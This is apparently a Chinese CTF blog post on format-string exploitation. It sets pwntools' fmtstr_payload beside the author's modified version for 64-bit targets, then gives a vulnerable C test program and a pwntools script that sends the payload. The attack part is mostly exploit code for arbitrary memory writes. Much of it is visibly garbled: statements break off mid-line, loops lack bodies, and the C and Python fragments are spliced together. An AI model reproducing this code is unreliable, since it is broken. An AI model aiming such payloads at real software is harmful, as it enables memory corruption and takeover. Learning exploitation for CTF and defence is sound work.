# 格式化字符串总结
我觉得总结格式化字符串，拿大量的例题不如自己写下payload自动生成，payload又分32位跟64位，不过原理是一样的，不过64位地址有太多的00，printf有00截断，所以要将地址放后面，不能放前面  
本来还想从头写的，我觉得站在巨人的肩膀上干事更快
既然pwntools他的payload不支持64位，我们稍微改动下或许可以让他支持64位的
至于堆上和bss上的格式化字符串，就以360那道为例子讲了
## payload生成
我通过修改这部分的源代码来总结下格式化字符串,经过我修改的代码后，既可以适应64位格式化字符串，也可以适应32位格式化字符串，不过无法适应坏字符，比如scanf的截断等等  
当然这只是我个人测试了而已，测试能写，适应byte,short,int的写入
## 源码对比
这份是未改动的，当然也删掉了注释
    def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte'):
        # 'byte': (number, step, mask, format, decalage)
        config = {
            32 : {
                'byte': (4, 1, 0xFF, 'hh', 8),
                'short': (2, 2, 0xFFFF, 'h', 16),
                'int': (1, 4, 0xFFFFFFFF, '', 32)},
            64 : {
                'byte': (8, 1, 0xFF, 'hh', 8),
                'short': (4, 2, 0xFFFF, 'h', 16),
                'int': (2, 4, 0xFFFFFFFF, '', 32)
            }
        }
        if write_size not in ['byte', 'short', 'int']:
            log.error("write_size must be 'byte', 'short' or 'int'")
        number, step, mask, formatz, decalage = config[context.bits][write_size]
        # add wheres
        payload = ""
        for where, what in writes.items():
            for i in range(0, number*step, step):
                payload += pack(where+i)
        numbwritten += len(payload)
        fmtCount = 0
        for where, what in writes.items():
            for i in range(0, number):
                current = what & mask
                if numbwritten & mask >= decalage
                fmtCount += 1
        return payload
这份是我改动过后的，我这里将大段注释都删掉了
    def fmtstr_payload(offset, writes, numbwritten=0, write_size='byte'):
        # 'byte': (number, step, mask, format, decalage)
        config = {
            32 : {
                'byte': (4, 1, 0xFF, 'hh', 8),
                'short': (2, 2, 0xFFFF, 'h', 16),
                'int': (1, 4, 0xFFFFFFFF, '', 32)},
            64 : {
                'byte': (8, 1, 0xFF, 'hh', 8),
                'short': (4, 2, 0xFFFF, 'h', 16),
                'int': (2, 4, 0xFFFFFFFF, '', 32)
            }
        }
        if write_size not in ['byte', 'short', 'int']:
            log.error("write_size must be 'byte', 'short' or 'int'")
        number, step, mask, formatz, decalage = config[context.bits][write_size]
        #  init variable
        payload = ""
        fmtCount = 0
        part = []
        # part addr
        for where, what in writes.items():
            for i in range(0, number*step, step):
                current = what & mask
                part.append( (current, pack(where+i)) )
                what >>= decalage
        part.sort(key=lambda tup:tup[0])
        # get size
        size = []
        for i in range(number):
            size.append(part[i][0])
        for i in range(0, number):
            if numbwritten & mask >= decalage
        part.sort(key=lambda tup:tup[0])
注意，这里步长要跟跟设置一样，这样才能地址跳着来
### 获取写入大小，按升序
    # get size
        size = []
        for i in range(number):
            size.append(part[i][0])
### 生成payload
    for i in range(0, number):
            if numbwritten & mask 
    int want= 0x80408050;
    int want1= 0x80408050;
    int want2= 0x80408050;
    int want3= 0x80408050;
    int main() {
        char buf[1000];
        printf("%p\n", &want3);
        for(int i=0; i " + hex(addr))
    gdb.attach(io, "b printf\nc")
    context.arch='i386'
    payload = fmtstr_payload(13, {addr:0x5}, 0, 'byte')
    print("---------------------------------------------")
    print(payload)
    print(len(payload))
    io.sendline(payload)
    io.interactive()
##### 测试byte写入
    payload = fmtstr_payload(13, {addr:0x5}, 0, 'byte')
##### 测试short写入
    payload = fmtstr_payload(9, {addr:0x5}, 0, 'short')
##### 测试int写入